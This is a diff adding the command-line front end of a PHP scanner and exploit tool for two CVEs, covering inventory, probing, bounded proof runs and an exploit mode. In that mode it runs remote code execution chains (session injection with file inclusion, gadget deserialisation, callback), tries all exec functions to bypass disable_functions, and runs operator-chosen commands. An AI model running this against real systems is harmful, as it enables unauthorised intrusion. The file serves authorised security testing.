@@ -1,0 +1,813 @@
+"""Command line interface for the evidence-first scanner.
+
+Modes:
+  inventory  build/package/SAPI inventory, GET requests only
+  probe      low-impact frontend -> PHP reachability probes
+  prove      explicit, bounded scenario execution (requires --ack-authorised)
+  exploit    destructive chain with out-of-band callback verification
+  report     rebuild findings from stored evidence, no network
+  verify     verify evidence artefact hashes
+"""
+
+from __future__ import annotations
+
+import argparse
+import ipaddress
+import json
+import os
+import re
+import socket
+import sys
+import time
+from typing import Any, Dict, List, Optional
+from urllib.parse import urlsplit
+
+from .assess import assess_all, assess_exploit
+from .evidence import RunStore
+from .exploit import (
+    MAX_ATTEMPTS,
+    ExploitBudget,
+    ExploitOptions,
+    run_exploit,
+)
+from .http import HttpClient
+from .inventory import InventoryOptions, collect
+from .models import CaseFile, Finding, ScenarioRun, TargetProfile
+from .probe import run_probe
+from .prove import ProveEngine, ProveLimits, ProveOptions
+from .report import build_document, write_reports
+from .scenarios import SCENARIOS, scenario_list, select
+from .util import new_id, slugify, utcnow
+from .version import CVE_618, CVE_619, VERSION
+
+PROOF_STATUSES = {
+    "AFFECTED_PATH_CONFIRMED",
+    "PRODUCER_CONSUMER_CORRELATED",
+    "STALE_STATE_CONFIRMED",
+    "CODE_EXECUTION_CONFIRMED",
+}
+
+
+def _abort(message: str) -> None:
+    """Report a bad invocation and exit with the documented usage-error code."""
+    print(f"error: {message}", file=sys.stderr)
+    raise SystemExit(2)
+
+
+def _parse_headers(values: Optional[List[str]]) -> Dict[str, str]:
+    headers: Dict[str, str] = {}
+    for value in values or []:
+        if ":" not in value:
+            _abort(f"invalid --header (expected 'Name: value'): {value!r}")
+        name, val = value.split(":", 1)
+        name, val = name.strip(), val.strip()
+        if not name or any(ch in name + val for ch in ("\r", "\n", "\x00")):
+            _abort(f"unsafe --header value: {value!r}")
+        headers[name] = val
+    return headers
+
+
+def _default_out(mode: str, target: str) -> str:
+    return os.path.join("runs", f"{slugify(target)}-{mode}-{new_id('run')[-8:]}")
+
+
+def _client(args: argparse.Namespace) -> HttpClient:
+    return HttpClient(
+        base_url=args.target.rstrip("/") + "/",
+        timeout=args.timeout,
+        insecure=args.insecure,
+        max_body=args.max_body,
+        ca_file=args.ca_file,
+        extra_headers=_parse_headers(args.header),
+        proxy=args.proxy,
+        host_header=args.host_header,
+        follow_redirects=not args.no_redirects,
+    )
+
+
+def _inventory_options(args: argparse.Namespace) -> InventoryOptions:
+    return InventoryOptions(
+        inventory_json=args.inventory_json,
+        php_binary=args.php_binary,
+        status_url=args.status_url,
+        sapi=args.sapi,
+        environment_kind=args.environment_kind,
+        synthetic=bool(getattr(args, "synthetic_fixture", False)),
+        insecure=args.insecure,
+        timeout=args.timeout,
+        extra_headers=_parse_headers(args.header),
+        ca_file=args.ca_file,
+        proxy=args.proxy,
+    )
+
+
+def _case(
+    run_id: str,
+    profile: TargetProfile,
+    evidence: List[Any],
+    runs: List[ScenarioRun],
+    mode: str,
+    environment: Dict[str, Any],
+) -> CaseFile:
+    return CaseFile(
+        profile=profile,
+        evidence=evidence,
+        scenario_runs=runs,
+        run_id=run_id,
+        tool_version=VERSION,
+        mode=mode,
+        started_at=environment.get("started_at", utcnow()),
+        finished_at=utcnow(),
+        environment=environment,
+    )
+
+
+def _existing_runs(store: RunStore) -> List[ScenarioRun]:
+    """Preserve scenario runs when a run directory is reused across modes."""
+    if not os.path.exists(store.case_path):
+        return []
+    try:
+        return list(store.read_case().scenario_runs)
+    except (OSError, ValueError, KeyError):
+        return []
+
+
+def _merge_runs(
+    existing: List[ScenarioRun], new: List[ScenarioRun]
+) -> List[ScenarioRun]:
+    """Deduplicate by scenario id, preferring an executed run over a skip."""
+    merged: Dict[str, ScenarioRun] = {}
+    order: List[str] = []
+    for run in existing + new:
+        if run.scenario_id not in merged:
+            merged[run.scenario_id] = run
+            order.append(run.scenario_id)
+            continue
+        if run.executed:
+            # An explicit rerun (--allow-rerun) replaces the earlier executed
+            # run in the case view; the earlier evidence remains append-only.
+            merged[run.scenario_id] = run
+    return [merged[scenario_id] for scenario_id in order]
+
+
+def _finalise(
+    store: RunStore,
+    case: CaseFile,
+    findings: List[Finding],
+    outdir: str,
+    print_json: bool,
+    exploit_result=None,
+    exploit_assessment=None,
+    exploit_confirmed: bool = False,
+) -> int:
+    errors = case.validate()
+    for finding in findings:
+        errors.extend(finding.validate())
+    store.write_case(case)
+    store.write_findings(findings)
+    verification_errors = store.verify() + errors
+    doc = build_document(case, findings, verification_errors)
+    paths = write_reports(outdir, doc, findings)
+    payload = {
+        "target": case.profile.target,
+        "run_id": case.run_id,
+        "mode": case.mode,
+        "verdicts": {
+            finding.cve: {
+                "status": finding.status,
+                "reason": finding.status_reason,
+                "missing_evidence": finding.missing_evidence,
+            }
+            for finding in findings
+        },
+        "out": outdir,
+        "files": paths,
+        "integrity_ok": not verification_errors,
+        "validation_errors": errors,
+    }
+    if exploit_result is not None:
+        payload["exploit"] = exploit_result.to_dict()
+    if exploit_assessment is not None:
+        payload["exploit_assessment"] = exploit_assessment
+    if print_json:
+        print(json.dumps(payload, indent=2, ensure_ascii=False))
+    else:
+        print()
+        print(f"target : {case.profile.target}")
+        print(f"run    : {case.run_id}")
+        for finding in findings:
+            print(f"  {finding.cve}  {finding.status:32s} {finding.status_reason}")
+        print(f"files  : {outdir}")
+        if errors:
+            print("validation errors:")
+            for error in errors:
+                print(f"  - {error}")
+    if errors:
+        return 2
+    if exploit_confirmed or any(f.status in PROOF_STATUSES for f in findings):
+        return 1
+    return 0
+
+
+def _run_inventory_or_probe(args: argparse.Namespace, mode: str) -> int:
+    if mode == "inventory" and args.all:
+        # --all is explicitly not a prove switch; for inventory it is a no-op.
+        pass
+    outdir = args.out or _default_out(mode, args.target)
+    run_id = os.path.basename(outdir.rstrip("/\\"))
+    store = RunStore(outdir, run_id, args.target, mode, VERSION)
+    previous_runs = _existing_runs(store)
+    client = _client(args)
+    profile = collect(
+        args.target,
+        client,
+        _inventory_options(args),
+        store=store,
+        run_id=run_id,
+    )
+    probe_result = None
+    if mode == "probe":
+        probe_result = run_probe(
+            client,
+            profile,
+            store,
+            status_url=args.status_url,
+            timeout=args.probe_timeout,
+            synthetic=bool(args.synthetic_fixture),
+        )
+    environment = {
+        "kind": args.environment_kind,
+        "synthetic": bool(args.synthetic_fixture),
+        "telemetry_files": list(args.telemetry or []),
+        "probe": probe_result.to_dict() if probe_result else None,
+        "limits": None,
+        "started_at": utcnow(),
+    }
+    case = _case(
+        run_id, profile, store.load_evidence(), previous_runs, mode, environment
+    )
+    findings = assess_all(case)
+    return _finalise(store, case, findings, outdir, args.json)
+
+
+def _run_prove(args: argparse.Namespace) -> int:
+    if args.all:
+        _abort("--all never enables prove mode; pass explicit --scenario ids")
+    if not args.scenario:
+        _abort("prove requires at least one --scenario (for example --scenario 618-S2)")
+    if not args.ack_authorised:
+        _abort(
+            "prove requires --ack-authorised: written authorisation for the internal "
+            "target and a prepared telemetry/health channel"
+        )
+    scenarios = select(args.scenario)
+    limits = ProveLimits(
+        max_requests=args.max_requests,
+        max_bytes=args.max_bytes,
+        max_request_bytes=args.max_request_bytes,
+        timeout=args.probe_timeout,
+        health_timeout=args.timeout,
+        max_seconds=args.max_seconds,
+        concurrency=args.concurrency,
+        stop_on_degradation=True,
+    )
+    options = ProveOptions(
+        scenarios=scenarios,
+        acknowledge_authorised=True,
+        health_url=args.health_url,
+        status_url=args.status_url,
+        telemetry_files=list(args.telemetry or []),
+        telemetry_source=args.telemetry_source,
+        producer_url=args.producer_url,
+        consumer_url=args.consumer_url,
+        app_oom_endpoint=args.app_oom_endpoint,
+        app_oom_field=args.app_oom_field,
+        app_oom_mib=args.app_oom_mib,
+        canary_readback_url=args.canary_readback_url,
+        allow_rerun=args.allow_rerun,
+        allow_non_advisory_sapi=args.allow_non_advisory_sapi,
+        environment_kind="fixture" if args.synthetic_fixture else "lab",
+        synthetic=bool(args.synthetic_fixture),
+        limits=limits,
+    )
+    outdir = args.out or _default_out("prove", args.target)
+    run_id = os.path.basename(outdir.rstrip("/\\"))
+    store = RunStore(outdir, run_id, args.target, "prove", VERSION)
+    previous_runs = _existing_runs(store)
+    client = _client(args)
+    profile = collect(
+        args.target,
+        client,
+        _inventory_options(args),
+        store=store,
+        run_id=run_id,
+    )
+    probe_result = run_probe(
+        client,
+        profile,
+        store,
+        status_url=args.status_url,
+        timeout=args.probe_timeout,
+        synthetic=bool(args.synthetic_fixture),
+    )
+    engine = ProveEngine(client, store, profile, options, existing_runs=previous_runs)
+    outcome = engine.run()
+    environment = {
+        "kind": "fixture" if args.synthetic_fixture else "lab",
+        "synthetic": bool(args.synthetic_fixture),
+        "telemetry_files": list(args.telemetry or []),
+        "probe": probe_result.to_dict(),
+        "limits": limits.to_dict(),
+        "prove": outcome.to_dict(),
+        "started_at": outcome.started_at,
+        "stopped_reason": outcome.stopped_reason,
+        "interrupted": outcome.interrupted,
+    }
+    all_runs = _merge_runs(previous_runs, outcome.runs)
+    case = _case(run_id, profile, store.load_evidence(), all_runs, "prove", environment)
+    findings = assess_all(case)
+    return _finalise(store, case, findings, outdir, args.json)
+
+
+def _public_host(host: str) -> bool:
+    """True when any resolved address is globally routable."""
+    try:
+        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
+    except OSError:
+        return False
+    for info in infos:
+        try:
+            address = ipaddress.ip_address(str(info[4][0]))
+        except ValueError:
+            continue
+        if getattr(address, "ipv4_mapped", None):
+            address = address.ipv4_mapped
+        if address.is_global and not address.is_private:
+            return True
+    return False
+
+
+def _ingest_telemetry(
+    store: RunStore,
+    files: List[str],
+    source: Optional[str],
+    scenario_id: str,
+    synthetic: bool,
+) -> List[str]:
+    from .telemetry import parse_telemetry_file, source_for_path
+
+    refs: List[str] = []
+    for path in files:
+        events, errors = parse_telemetry_file(
+            path, source or source_for_path(path)
+        )
+        for error in errors:
+            store.add(
+                "operator",
+                {"parse_error": error, "file": path},
+                scenario_id=scenario_id,
+                trust="low",
+                notes="telemetry parse error",
+                synthetic=synthetic,
+            )
+        for event in events:
+            item = store.add_telemetry(
+                event,
+                scenario_id=scenario_id,
+                synthetic=synthetic,
+                trust="high" if event.source == "lab_trace" else "medium",
+            )
+            refs.append(item.id)
+    return refs
+
+
+def _run_exploit(args: argparse.Namespace) -> int:
+    if not args.ack_authorised:
+        _abort(
+            "exploit requires --ack-authorised: this sends actual exploit payloads to the target"
+        )
+    if args.proxy:
+        _abort(
+            "exploit mode uses raw sockets and does not support --proxy; "
+            "remove --proxy or use inventory/probe for proxied observation"
+        )
+    target_host = urlsplit(args.target).hostname or ""
+    if not args.allow_remote and _public_host(target_host):
+        _abort(
+            f"refusing to send exploit payloads to public host {target_host!r}; "
+            "use --allow-remote only with explicit written authorisation"
+        )
+    if args.host_header and any(
+        ch in args.host_header for ch in ("\r", "\n", "\x00")
+    ):
+        _abort("unsafe --host-header value")
+    if args.chain in ("A", "C") and not args.lfi_path:
+        _abort(
+            f"chain {args.chain} requires --lfi-path (for example '/page.php?page=')"
+        )
+    if args.chain == "B" and not args.gadget:
+        _abort(
+            "chain B requires --gadget with an application-specific serialised "
+            "POP chain; the scanner does not ship one"
+        )
+    if args.canary_nonce and not re.fullmatch(
+        r"P2S[A-Z0-9]{6,64}", args.canary_nonce
+    ):
+        _abort(
+            "--canary-nonce must match P2S[A-Z0-9]{6,64}; it is embedded in the "
+            "operator's gadget so the callback can be correlated"
+        )
+    if args.canary_nonce and args.chain != "B":
+        _abort("--canary-nonce is only used by chain B; it would not be embedded")
+    if args.canary_nonce and args.callback_port is None:
+        _abort("--canary-nonce requires --callback-port; without the scanner's "
+               "listener the callback cannot be verified")
+    if args.chain == "C" and args.callback_port is None:
+        _abort(
+            "chain C requires --callback-port: without a listener it cannot "
+            "verify RCE"
+        )
+    if args.max_requests < 1:
+        _abort("--max-requests must be at least 1")
+    if args.max_bytes < 1024:
+        _abort("--max-bytes must be at least 1024")
+    if args.max_seconds <= 0:
+        _abort("--max-seconds must be greater than 0")
+    outdir = args.out or _default_out("exploit", args.target)
+    run_id = os.path.basename(outdir.rstrip("/\\"))
+    store = RunStore(outdir, run_id, args.target, "exploit", VERSION)
+    previous_runs = _existing_runs(store)
+    client = _client(args)
+    profile = collect(
+        args.target,
+        client,
+        _inventory_options(args),
+        store=store,
+        run_id=run_id,
+    )
+    probe_result = run_probe(
+        client, profile, store,
+        status_url=args.status_url,
+        timeout=args.probe_timeout,
+        synthetic=bool(args.synthetic_fixture),
+    )
+
+    budget = ExploitBudget(
+        max_requests=args.max_requests,
+        max_bytes=args.max_bytes,
+        max_seconds=args.max_seconds,
+        started_at=time.monotonic(),
+    )
+    options = ExploitOptions(
+        chain=args.chain,
+        cve=args.cve,
+        lfi_path=args.lfi_path,
+        session_path=args.session_path,
+        inject_path=args.inject_path,
+        trigger_path=args.trigger_path,
+        command=args.command,
+        exec_func=args.exec_func,
+        gadget=args.gadget,
+        canary_nonce=args.canary_nonce,
+        callback_port=args.callback_port,
+        callback_bind=args.callback_bind,
+        callback_ip=args.callback_ip,
+        callback_expect=list(args.callback_expect or []),
+        attempts=args.attempts,
+        timeout=args.timeout,
+        race_delay=args.race_delay,
+        acknowledge_authorised=True,
+        environment_kind=args.environment_kind,
+        synthetic=bool(args.synthetic_fixture),
+        insecure=args.insecure,
+        ca_file=args.ca_file,
+        extra_headers=_parse_headers(args.header),
+        host_header=args.host_header,
+        max_body=args.max_body,
+        health_url=args.health_url,
+        budget=budget,
+    )
+    exploit_result = run_exploit(client, profile, store, options)
+
+    runs: List[ScenarioRun] = []
+    if exploit_result.scenario_run is not None:
+        telemetry_refs = _ingest_telemetry(
+            store,
+            list(args.telemetry or []),
+            args.telemetry_source,
+            exploit_result.scenario_id,
+            bool(args.synthetic_fixture),
+        )
+        if telemetry_refs:
+            exploit_result.scenario_run.telemetry_refs.extend(telemetry_refs)
+        runs.append(exploit_result.scenario_run)
+
+    environment = {
+        "kind": args.environment_kind,
+        "synthetic": bool(args.synthetic_fixture),
+        "telemetry_files": list(args.telemetry or []),
+        "probe": probe_result.to_dict(),
+        "exploit": exploit_result.to_dict(),
+        "limits": budget.to_dict(),
+        "started_at": exploit_result.started_at or utcnow(),
+        "degraded": exploit_result.degraded,
+    }
+    case = _case(
+        run_id, profile, store.load_evidence(),
+        _merge_runs(previous_runs, runs), "exploit", environment,
+    )
+    findings = assess_all(case)
+    assessment = assess_exploit(case)
+    case.environment["exploit_assessment"] = assessment
+    rc = _finalise(
+        store, case, findings, outdir, args.json,
+        exploit_result=exploit_result,
+        exploit_assessment=assessment,
+        exploit_confirmed=bool(assessment.get("confirmed")),
+    )
+
+    if not args.json:
+        print()
+        if assessment.get("confirmed"):
+            print(f"  [RCE OBSERVED] chain {exploit_result.chain}")
+            print(f"  attribution : {assessment.get('attribution')} "
+                  f"(callback proves execution, not which CVE path)")
+            print(f"  evidence    : {', '.join(assessment.get('evidence_refs') or [])}")
+            if exploit_result.callback:
+                print(f"  callback    : {exploit_result.callback.get('remote_addr', '?')}")
+            if exploit_result.command_output:
+                print(f"  command out :")
+                for line in exploit_result.command_output.strip().splitlines():
+                    print(f"    | {line}")
+        elif exploit_result.command_output:
+            print(f"  [UNVERIFIED OUTPUT] chain {exploit_result.chain}")
+            print(f"  note        : output was captured from the response body but "
+                  "no callback confirmed RCE")
+            print(f"  command out :")
+            for line in exploit_result.command_output.strip().splitlines():
+                print(f"    | {line}")
+        else:
+            print(f"  [NOT CONFIRMED] chain {exploit_result.chain}")
+        for note in exploit_result.notes:
+            print(f"  - {note}")
+        for err in exploit_result.errors:
+            print(f"  ! {err}")
+        print(f"  budget      : {budget.requests}/{budget.max_requests} requests, "
+              f"{budget.bytes}/{budget.max_bytes} bytes, {budget.elapsed():.1f}s")
+        if exploit_result.degraded:
+            print("  ! target health degraded after the chain")
+
+    if exploit_result.errors and not assessment.get("confirmed"):
+        return 2
+    return rc
+
+
+
+def _run_report(args: argparse.Namespace) -> int:
+    source = os.path.abspath(args.evidence_dir)
+    store = RunStore.open(source)
+    case = store.read_case()
+    # Rebuild the case from the saved profile/runs and the stored evidence.
+    case.mode = "report"
+    case.finished_at = utcnow()
+    findings = assess_all(case)
+    assessment = assess_exploit(case)
+    outdir = args.out or os.path.join(source, "report")
+    verification_errors = store.verify() + case.validate()
+    for finding in findings:
+        verification_errors.extend(finding.validate())
+    doc = build_document(case, findings, verification_errors)
+    paths = write_reports(outdir, doc, findings)
+    payload = {
+        "target": case.profile.target,
+        "run_id": case.run_id,
+        "mode": "report",
+        "verdicts": {f.cve: {"status": f.status, "reason": f.status_reason} for f in findings},
+        "exploit_assessment": assessment,
+        "files": paths,
+        "integrity_ok": not verification_errors,
+        "errors": verification_errors,
+    }
+    if args.json:
+        print(json.dumps(payload, indent=2, ensure_ascii=False))
+    else:
+        print(f"rebuilt report from {source} without network requests")
+        for finding in findings:
+            print(f"  {finding.cve}  {finding.status:32s} {finding.status_reason}")
+        print(f"  exploit      {'RCE OBSERVED' if assessment.get('confirmed') else 'NOT CONFIRMED'}"
+              f" (attribution: {assessment.get('attribution')})")
+        print(f"files: {outdir}")
+    if verification_errors:
+        return 2
+    if assessment.get("confirmed"):
+        return 1
+    if any(f.status in PROOF_STATUSES for f in findings):
+        return 1
+    return 0
+
+
+def _run_verify(args: argparse.Namespace) -> int:
+    store = RunStore.open(os.path.abspath(args.evidence_dir))
+    errors = store.verify()
+    case = store.read_case()
+    errors.extend(case.validate())
+    if args.json:
+        print(json.dumps({"ok": not errors, "errors": errors}, indent=2, ensure_ascii=False))
+    else:
+        print("PASS" if not errors else "FAIL")
+        for error in errors:
+            print(f"  - {error}")
+    return 0 if not errors else 2
+
+
+def _attempts_type(value: str) -> int:
+    try:
+        number = int(value)
+    except ValueError as exc:
+        raise argparse.ArgumentTypeError("must be an integer") from exc
+    if not 1 <= number <= MAX_ATTEMPTS:
+        raise argparse.ArgumentTypeError(
+            f"must be between 1 and {MAX_ATTEMPTS}"
+        )
+    return number
+
+
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        prog="php2shell_scanner_v4.py",
+        description=(
+            "Evidence-first exposure scanner for CVE-2026-109618 and CVE-2026-109619. "
+            "Modes: inventory, probe, prove, exploit, report, verify."
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+examples:
+  # 1. inventory only (GET, no OOM)
+  python php2shell_scanner_v4.py inventory https://target --out runs/t1
+
+  # 2. low-impact reachability probe (no OOM)
+  python php2shell_scanner_v4.py probe https://target --out runs/t1
+
+  # 3. bounded proof run against a prepared internal lab
+  python php2shell_scanner_v4.py prove http://127.0.0.1:8080 \\
+      --scenario 618-S2 --ack-authorised \\
+      --telemetry /var/log/php/error.log --telemetry /var/log/nginx/error.log \\
+      --status-url http://127.0.0.1:8080/status.php \\
+      --health-url http://127.0.0.1:8080/status.php \\
+      --out runs/lab-618
+
+  # 4. rebuild the report from evidence (no network)
+  python php2shell_scanner_v4.py report runs/lab-618 --out runs/lab-618/report
+
+  # 5. verify artefact hashes
+  python php2shell_scanner_v4.py verify runs/lab-618
+""",
+    )
+    sub = parser.add_subparsers(dest="mode", required=True)
+
+    def common(p: argparse.ArgumentParser) -> None:
+        p.add_argument("--out", help="evidence/run directory")
+        p.add_argument("--json", action="store_true", help="machine-readable stdout summary")
+        p.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (seconds)")
+        p.add_argument("--probe-timeout", type=float, default=30.0, help="probe/health timeout (seconds)")
+        p.add_argument("--max-body", type=int, default=262144, help="max response bytes stored")
+        p.add_argument("--insecure", action="store_true", help="disable TLS verification (explicit opt-in)")
+        p.add_argument("--ca-file", help="custom CA bundle")
+        p.add_argument("--header", action="append", help="extra request header 'Name: value' (repeatable)")
+        p.add_argument("--host-header", help="override the HTTP Host header")
+        p.add_argument("--proxy", help="HTTP proxy URL")
+        p.add_argument("--no-redirects", action="store_true", help="do not follow redirects")
+        p.add_argument("--inventory-json", help="operator inventory JSON (build/package/backports)")
+        p.add_argument("--php-binary", help="local php binary used for a host inventory probe")
+        p.add_argument("--status-url", help="lab status endpoint returning sapi/worker/request id JSON")
+        p.add_argument("--sapi", default="auto",
+                       choices=("auto", "mod_php", "fpm", "frankenphp", "lsapi", "cli-server", "cgi-fcgi", "unknown"),
+                       help="declared SAPI; auto stays UNKNOWN without a verified source")
+        p.add_argument("--environment-kind", default="remote",
+                       choices=("remote", "lab", "fixture"), help="provenance label")
+        p.add_argument("--telemetry", action="append", help="imported log/trace file (repeatable)")
+        p.add_argument("--telemetry-source", help="force source for imported telemetry")
+        p.add_argument("--synthetic-fixture", action="store_true",
+                       help="mark all evidence as synthetic; never allows confirmed statuses")
+        p.add_argument("--all", action="store_true",
+                       help="inventory/probe: run all low-impact checks; never enables prove")
+
+    inv = sub.add_parser("inventory", help="build/package/SAPI inventory (GET only)")
+    inv.add_argument("target")
+    common(inv)
+
+    probe = sub.add_parser("probe", help="low-impact frontend -> PHP reachability probes")
+    probe.add_argument("target")
+    common(probe)
+
+    prove = sub.add_parser("prove", help="bounded scenario execution (explicit authorisation)")
+    prove.add_argument("target")
+    common(prove)
+    prove.add_argument("--scenario", action="append", help="scenario id, e.g. 618-S2 or 619-S2 (repeatable)")
+    prove.add_argument("--ack-authorised", action="store_true",
+                       help="confirm written authorisation for the internal target")
+    prove.add_argument("--health-url", help="health check URL (default: target)")
+    prove.add_argument("--max-requests", type=int, default=8)
+    prove.add_argument("--max-bytes", type=int, default=32 * 1024 * 1024)
+    prove.add_argument("--max-request-bytes", type=int, default=8 * 1024 * 1024)
+    prove.add_argument("--max-seconds", type=float, default=180.0)
+    prove.add_argument("--concurrency", type=int, default=1,
+                       help="must be 1: worker correlation requires sequential requests")
+    prove.add_argument("--producer-url", help="lab harness producer endpoint")
+    prove.add_argument("--consumer-url", help="lab harness consumer endpoint")
+    prove.add_argument("--app-oom-endpoint", help="application fixture endpoint for 618-S4")
+    prove.add_argument("--app-oom-field", help="multipart field consumed by the 618-S4 fixture")
+    prove.add_argument("--app-oom-mib", type=int, default=8)
+    prove.add_argument("--canary-readback-url", help="independent canary readback endpoint")
+    prove.add_argument("--allow-rerun", action="store_true",
+                       help="allow a scenario id to run again in the same evidence set")
+    prove.add_argument("--allow-non-advisory-sapi", action="store_true",
+                       help="run OOM diagnostics on a SAPI the advisory did not evaluate")
+
+    exploit = sub.add_parser("exploit", help="exploit chains with RCE verification (requires --ack-authorised)")
+    exploit.add_argument("target")
+    common(exploit)
+    exploit.add_argument("--chain", default="A", choices=("A", "B", "C"),
+                         help="exploit chain: A=session+LFI, B=gadget deser, C=direct callback")
+    exploit.add_argument("--cve", choices=(CVE_618, CVE_619),
+                         help="CVE label for the run (default: chain-specific)")
+    exploit.add_argument("--ack-authorised", action="store_true",
+                         help="confirm written authorisation for exploit execution")
+    exploit.add_argument("--lfi-path", help="LFI path (e.g. /page.php?page=)")
+    exploit.add_argument("--session-path", default="/tmp/sessions/sess_",
+                         help="PHP session file prefix; must match session.save_path")
+    exploit.add_argument("--inject-path", default="/index.php",
+                         help="path for session injection POST")
+    exploit.add_argument("--trigger-path", help="path for gadget trigger (chain B)")
+    exploit.add_argument("--command", default="id", help="command to execute on target")
+    exploit.add_argument("--exec-func", default=None,
+                         choices=("system", "passthru", "shell_exec", "exec", "popen", "proc_open"),
+                         help="preferred PHP execution function (the scanner tries all "
+                              "functions automatically to bypass disable_functions; this "
+                              "sets which one to try first)")
+    exploit.add_argument("--gadget", help="serialised POP chain required by chain B")
+    exploit.add_argument("--canary-nonce",
+                         help="chain B only: nonce to embed in the operator's gadget "
+                              "so its callback can be correlated (P2S[A-Z0-9]{6,64}; "
+                              "use a fresh value per run)")
+    exploit.add_argument("--callback-port", type=int, default=None,
+                         help="callback listener port (omit to disable, 0=auto)")
+    exploit.add_argument("--callback-bind", default="0.0.0.0",
+                         help="callback listener bind address")
+    exploit.add_argument("--callback-ip", help="IP the target should call back to (auto-detected if omitted)")
+    exploit.add_argument("--callback-expect", action="append",
+                         help="source IP the callback is expected from (repeatable; "
+                              "useful behind NAT)")
+    exploit.add_argument("--attempts", type=_attempts_type, default=5,
+                         help=f"number of exploit attempts (1..{MAX_ATTEMPTS})")
+    exploit.add_argument("--race-delay", type=float, default=0.05,
+                         help="upload-progress stall delay for chain A (0 disables; "
+                              "skipped automatically on single-threaded cli-server)")
+    exploit.add_argument("--max-requests", type=int, default=40,
+                         help="request budget for the exploit chain (health/probe excluded)")
+    exploit.add_argument("--max-bytes", type=int, default=32 * 1024 * 1024,
+                         help="sent+received byte budget for the exploit chain")
+    exploit.add_argument("--max-seconds", type=float, default=120.0,
+                         help="wall-clock budget for the exploit chain")
+    exploit.add_argument("--health-url", help="health check URL (default: target base URL)")
+    exploit.add_argument("--allow-remote", action="store_true",
+                         help="allow exploit payloads against a globally routable host")
+
+    report = sub.add_parser("report", help="rebuild findings from stored evidence (no network)")
+    report.add_argument("evidence_dir")
+    report.add_argument("--out", help="report output directory")
+    report.add_argument("--json", action="store_true")
+
+    verify = sub.add_parser("verify", help="verify evidence artefact hashes")
+    verify.add_argument("evidence_dir")
+    verify.add_argument("--json", action="store_true")
+
+    return parser
+
+
+def main(argv: Optional[List[str]] = None) -> int:
+    parser = build_parser()
+    args = parser.parse_args(argv)
+    try:
+        if args.mode == "inventory":
+            return _run_inventory_or_probe(args, "inventory")
+        if args.mode == "probe":
+            return _run_inventory_or_probe(args, "probe")
+        if args.mode == "prove":
+            return _run_prove(args)
+        if args.mode == "exploit":
+            return _run_exploit(args)
+        if args.mode == "report":
+            return _run_report(args)
+        if args.mode == "verify":
+            return _run_verify(args)
+    except SystemExit:
+        raise
+    except KeyboardInterrupt:
+        print("interrupted; partial evidence was persisted where possible", file=sys.stderr)
+        return 130
+    except Exception as exc:
+        print(f"error: {type(exc).__name__}: {exc}", file=sys.stderr)
+        return 2
+    parser.error("unknown mode")
+    return 2
